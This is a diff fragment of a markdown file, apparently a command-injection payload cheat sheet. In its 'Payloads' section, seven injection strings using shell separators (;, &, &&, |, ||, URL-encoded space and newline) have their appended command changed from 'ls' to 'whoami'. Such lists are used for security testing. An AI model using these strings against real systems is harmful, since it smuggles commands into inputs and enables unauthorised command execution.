@@ -6,13 +6,13 @@
 
 ## Payloads
 ```
-;ls
-;%20ls
-&ls
-&&ls
-|ls
-||ls
-%0Als
+;whoami
+;%20whoami
+&whoami
+&&whoami
+|whoami
+||whoami
+%0Awhoami
 ```
 
 ## Useful commands
